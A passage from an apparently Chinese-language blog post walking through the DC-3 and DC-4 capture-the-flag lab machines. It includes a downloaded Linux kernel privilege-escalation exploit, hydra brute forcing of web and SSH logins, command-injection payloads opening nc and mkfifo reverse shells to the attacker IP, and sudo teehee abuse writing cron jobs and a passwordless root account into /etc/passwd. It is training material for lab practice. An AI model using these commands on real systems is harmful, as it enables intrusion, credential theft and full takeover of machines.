</code></pre><p>使用<code>searchsploit</code>查看关键字<code>Ubuntu和16.04</code>的漏洞</p>
<pre><code>searchsploit Ubuntu 16.04
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-5.png" alt="3-5"></p>
<p>使用<code>exploits/linux/local/39772.txt</code>，通过<code>-m</code>参数复制到当前目录下</p>
<pre><code>root@Knlvre:~# searchsploit -m exploits/linux/local/39772.txt
  Exploit: Linux Kernel 4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege Escalation
      URL: https://www.exploit-db.com/exploits/39772
     Path: /usr/share/exploitdb/exploits/linux/local/39772.txt
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /root/39772.txt
</code></pre><p>查看<code>39772.txt</code>可以看到介绍用法</p>
<pre><code>root@Knlvre:~# tail -20 39772.txt 

An exploit that puts all this together is in exploit.tar. Usage:

user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
user@host:~/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you&#39;ll have a root shell in &lt;=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@host:~/ebpf_mapfd_doubleput# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)

This exploit was tested on a Ubuntu 16.04 Desktop system.

Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7


Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552
Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
</code></pre><p>注意到上面的这个<code>Exploit-DB Mirror</code>，下载这个<code>zip</code>文件到靶机上</p>
<pre><code>$ pwd
/var/www/html/templates/protostar
$ ls
component.php
css
...
$ mkdir 39772
$ cd 39772
$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
--2019-09-23 16:01:08--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
...
2019-09-23 16:01:10 (4.38 MB/s) - &#39;39772.zip&#39; saved [7025/7025]

$ ls
39772.zip
$ unzip 39772.zip
Archive:  39772.zip
   creating: 39772/
  inflating: 39772/.DS_Store         
   creating: __MACOSX/
   creating: __MACOSX/39772/
  inflating: __MACOSX/39772/._.DS_Store  
  inflating: 39772/crasher.tar       
  inflating: __MACOSX/39772/._crasher.tar  
  inflating: 39772/exploit.tar       
  inflating: __MACOSX/39772/._exploit.tar  
$ ls
39772
39772.zip
__MACOSX
$ cd 39772
$ ls
crasher.tar
exploit.tar
$ tar -xvf exploit.tar
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
$ ls
crasher.tar
ebpf_mapfd_doubleput_exploit
exploit.tar
$ cd ebpf_mapfd_doubleput_exploit
$ ls
compile.sh
doubleput.c
hello.c
suidhelper.c
$ ./compile.sh
doubleput.c: In function &#39;make_setuid&#39;:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)&quot;&quot;
               ^
$ ls
compile.sh
doubleput
doubleput.c
hello
hello.c
suidhelper
suidhelper.c
$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you&#39;ll have a root shell in &lt;=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
</code></pre><p>执行<code>compile.sh</code>的过程中好像报错了，但是不要紧，还是生成了<code>doubleput</code>，执行后拿到了<code>root</code>权限，拿到了flag</p>
<pre><code>cd ~
ls
the-flag.txt
cat the-flag.txt
 __        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)


Congratulations are in order for completing DC-3VM.  :-)

I hope you&#39;ve enjoyed this challenge as much as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!
</code></pre><h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84）</p>
<p>靶机：DC-4（IP：192.168.43.193）</p>
<h2 id="渗透测试-3"><a href="#渗透测试-3" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描靶机，发现开启了<code>22</code>和<code>80</code>端口</p>
<pre><code>root@Knlvre:~# nmap -p1-65535 -A 192.168.43.193
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-23 14:20 CST
Nmap scan report for dc-4 (192.168.43.193)
Host is up (0.00069s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
MAC Address: 00:0C:29:CA:EC:58 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms dc-4 (192.168.43.193)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
</code></pre><p>访问80端口，是一个登录页面，没有次数、验证码之类的限制</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-1.png" alt="4-1"></p>
<p>查看源码，<code>hydra</code>爆破</p>
<pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;System Tools&lt;/title&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;css/styles.css&quot;&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;inner&quot;&gt;
            &lt;h2&gt;Admin Information Systems Login&lt;/h2&gt;
            &lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt;
                Username:&lt;br&gt;
                &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot;&gt;&lt;p&gt;
                Password:&lt;br&gt;
                &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot;&gt;&lt;p&gt;
                &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
            &lt;/form&gt;

        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<pre><code>root@Knlvre:/usr/share/wordlists# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.43.193 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 14:38:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.43.193:80/login.php:username=^USER^&amp;password=^PASS^:S=logout
[80][http-post-form] host: 192.168.43.193   login: admin   password: happy
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 14:39:01
</code></pre><p>获得<code>用户名admin - 密码happy</code>。登录之后可以进行3个操作：<code>ls -l、du -h、df -h</code>，可能存在命令执行漏洞</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-2.png" alt="4-2"></p>
<p>抓包，发现可以直接修改要执行的命令并直接执行</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-3.png" alt="4-3"></p>
<p>现在直接通过<code>nc</code>命令反弹一个shell</p>
<pre><code>radio=nc -e /bin/sh 192.168.43.84 3737&amp;submit=Run
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-4.png" alt="4-4"></p>
<p>如果不支持<code>-e</code>参数，也可以创建远程shell，命令与DC3中一样，但是此处好像不行，到<code>2&gt;</code>处就断了，不再去看</p>
<p>意义：创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口3737上。至此，我们已经把netcat的输出重定向到fifo文件中。</p>
<p>说明：从网络收到的输入写到fifo文件中，cat 命令读取fifo文件并且其内容发送给sh命令，sh命令进程受到输入并把它写回到netcat。netcat 通过网络发送输出到client</p>
<p>至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。</p>
<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh 2&gt;&amp;1 | nc 192.168.43.84 3737 &gt; /tmp/f
</code></pre><p>回归正题，拿到shell之后，切换到<code>/home</code>目录下，发现有3个用户<code>charles,jim,sam</code>，只有<code>jim</code>目录下有东西，在<code>/home/jim/backups/</code>目录下发现密码文件<code>old-passwords.bak</code>，里面存放着很多密码，除此之外没有其他有用信息。回到上级目录，发现<code>mbox</code>其他人没有权限读，十分可疑。那应该就是要获取<code>jim</code>的密码，ssh登录然后查看了</p>
<p>将密码文件复制下来写入<code>dc4_passwords.txt</code>，前面扫描端口发现还开放22号端口，那么接下来就用<code>hydra</code>爆破<code>ssh</code></p>
<pre><code>root@Knlvre:~# hydra -l jim -P dc4_passwords.txt ssh://192.168.43.193
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 16:10:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task
[DATA] attacking ssh://192.168.43.193:22/
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 76 to do in 00:01h, 16 active
[22][ssh] host: 192.168.43.193   login: jim   password: jibril04
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 16:11:48
</code></pre><p>ssh登录成功，查看mbox</p>
<pre><code>root@Knlvre:~# ssh jim@192.168.43.193
The authenticity of host &#39;192.168.43.193 (192.168.43.193)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;192.168.43.193&#39; (ECDSA) to the list of known hosts.
jim@192.168.43.193&#39;s password: 
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686

The programs includ...

jim@dc-4:~$ ls
backups  mbox  test.sh
jim@dc-4:~$ cat mbox
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: &lt;root@dc-4&gt;
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
    (envelope-from &lt;root@dc-4&gt;)
    id 1hCiQe-0000gc-EC
    for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset=&quot;UTF-8&quot;
Content-Transfer-Encoding: 8bit
Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;
From: root &lt;root@dc-4&gt;
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.
</code></pre><p>切换到<code>/var/mail</code>下获得<code>Charles</code>的密码</p>
<pre><code>jim@dc-4:~$ cd /var/mail
jim@dc-4:/var/mail$ ls
jim
jim@dc-4:/var/mail$ cat jim
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: &lt;charles@dc-4&gt;
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
    (envelope-from &lt;charles@dc-4&gt;)
    id 1hCjIX-0000kO-Qt
    for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset=&quot;UTF-8&quot;
Content-Transfer-Encoding: 8bit
Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;
From: Charles &lt;charles@dc-4&gt;
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&amp;hvim0y

See ya,
Charles
</code></pre><p>登录<code>charles</code>，尝试命令<code>sudo -l</code>时却提示用<code>teehee</code>提权</p>
<pre><code>jim@dc-4:/var/mail$ su charles
Password: 
charles@dc-4:/var/mail$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
</code></pre><p>参考别人的文章， 有两种方法：</p>
<p>方法一：</p>
<p>①<code>crontab</code>：是一个计划表，可以定时地执行命令。而需要命令立即执行只要设置为五个<code>*</code>就可以：<code>* * * * *</code></p>
<p>②<code>teehee</code>：是一个命令，但暂时未弄清楚功能</p>
<p>首先我们进行测试，创建文件666，改变他的权限</p>
<pre><code># sudo teehee /etc/crontab
# * * * * * root chmod 4777 /home/charles/666

charles@dc-4:~$ touch 666
charles@dc-4:~$ ls -la 666
-rw-r--r-- 1 charles charles 0 Sep 23 21:01 666
charles@dc-4:~$ sudo teehee /etc/crontab
* * * * * root chmod 4777 /home/charles/666    #此条命令输入一次，回车就可以
* * * * * root chmod 4777 /home/charles/666
^C
charles@dc-4:~$ ls -la 666
-rwsrwxrwx 1 charles charles 0 Sep 23 21:01 666
</code></pre><p>现在可以去改变<code>/bin/sh</code>的权限</p>
<pre><code>charles@dc-4:~$ ls -la /bin/sh
lrwxrwxrwx 1 root root 4 Jan 24  2017 /bin/sh -&gt; dash
charles@dc-4:~$ ls -la /bin/dash
-rwxrwxrwx 1 root root 124492 Jan 24  2017 /bin/dash
charles@dc-4:~$ sudo teehee /etc/crontab
* * * * * root chmod 4777 /bin/sh
* * * * * root chmod 4777 /bin/sh
^C
charles@dc-4:~$ ls -la /bin/dash
-rwsrwxrwx 1 root root 124492 Jan 24  2017 /bin/dash
</code></pre><p>可以看到<code>/bin/dash</code>权限改变成功，接下来直接使用<code>/bin/sh</code>，找flag并读取</p>
<pre><code>charles@dc-4:~$ /bin/sh
# find / -name &quot;*flag*&quot;
....
/sys/module/scsi_mod/parameters/default_dev_flags
/root/flag.txt
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
# cat /root/flag.txt    



888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  
888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.

</code></pre><p>方法二：</p>
<p><code>teehee -a</code>参数可以不覆盖地向指定文件添加内容，通过这个向<code>passwd</code>中添加一个用户</p>
<p>Ps：查看passwd，root用户的登录shell为<code>/bin/bash</code></p>
<pre><code>charles@dc-4:~$ tail -3 /etc/passwd
jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
Debian-exim:x:108:112::/var/spool/exim4:/bin/false
charles@dc-4:~$ echo &quot;Knlvre_hack::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd
Knlvre_hack::0:0:::/bin/bash
charles@dc-4:~$ tail -3 /etc/passwd
sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
Debian-exim:x:108:112::/var/spool/exim4:/bin/false
Knlvre_hack::0:0:::/bin/bash
</code></pre><p>参数解释</p>
<pre><code>#如：admin:x:0:0::/home/admin:/bin/bash

#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]
</code></pre><p>添加成功之后，由于没有设置密码，所以直接登录，直接是root权限</p>
<pre><code>charles@dc-4:~$ su Knlvre_hack
root@dc-4:/home/charles# id
uid=0(root) gid=0(root) groups=0(root)
root@dc-4:/home/charles# cat /root/flag.txt



888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  
888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre><hr>
<p><strong>Reference</strong></p>
<p><a href="https://blog.csdn.net/auuuuuuuu/article/details/97832336" target="_blank" rel="noopener">https://blog.csdn.net/auuuuuuuu/article/details/97832336</a></p>
<p><a href="https://blog.51cto.com/5437315/2420079" target="_blank" rel="noopener">https://blog.51cto.com/5437315/2420079</a></p>
<p><a href="https://www.cnblogs.com/Q--T/p/7864795.html" target="_blank" rel="noopener">https://www.cnblogs.com/Q--T/p/7864795.html</a></p>
<p><a href="https://www.anquanke.com/post/id/178658" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178658</a></p>
<p><a href="https://blog.csdn.net/Z_Grant/article/details/100866879" target="_blank" rel="noopener">https://blog.csdn.net/Z_Grant/article/details/100866879</a></p>
<p><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/188989.html</a></p>
<p><a href="https://gtfobins.github.io/gtfobins/git/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/git/</a></p>
<p><a href="https://www.cnblogs.com/daxueba-ITdaren/p/10811791.html" target="_blank" rel="noopener">https://www.cnblogs.com/daxueba-ITdaren/p/10811791.html</a></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/knlvre.github.io/statics/chengdu.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d=''
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
                    <p>Knlvre</p>
                    <span>There seems to be a umbilical cord between the computer and his soul. That's why as long as he is in front of the computer, he will become a giant!</span>
                    <dl>
                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">61 <p>Articles</p></a></li>
                    <li><a href="/categories">0 <p>Categories</p></a></li>
                    <li><a href="/tags">9 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-1"><span class="toc-number">2.</span> <span class="toc-text">DC-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-number">2.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透测试"><span class="toc-number">2.2.</span> <span class="toc-text">渗透测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-2"><span class="toc-number">3.</span> <span class="toc-text">DC-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境-1"><span class="toc-number">3.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透测试-1"><span class="toc-number">3.2.</span> <span class="toc-text">渗透测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-3"><span class="toc-number">4.</span> <span class="toc-text">DC-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境-2"><span class="toc-number">4.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透测试-2"><span class="toc-number">4.2.</span> <span class="toc-text">渗透测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-4"><span class="toc-number">5.</span> <span class="toc-text">DC-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境-3"><span class="toc-number">5.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透测试-3"><span class="toc-number">5.2.</span> <span class="toc-text">渗透测试</span></a></li></ol></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2019
        <span class="gradient-text">
            Knlvre
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/knlvre.github.io/js/plugin.js"></script>
<script src="/knlvre.github.io/js/obsidian.js"></script>
<script src="/knlvre.github.io/js/jquery.truncate.js"></script>
<script src="/knlvre.github.io/js/search.js"></script>
<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>



    <script src="/knlvre.github.io/js/busuanzi.min.js"></script>
    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>


<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
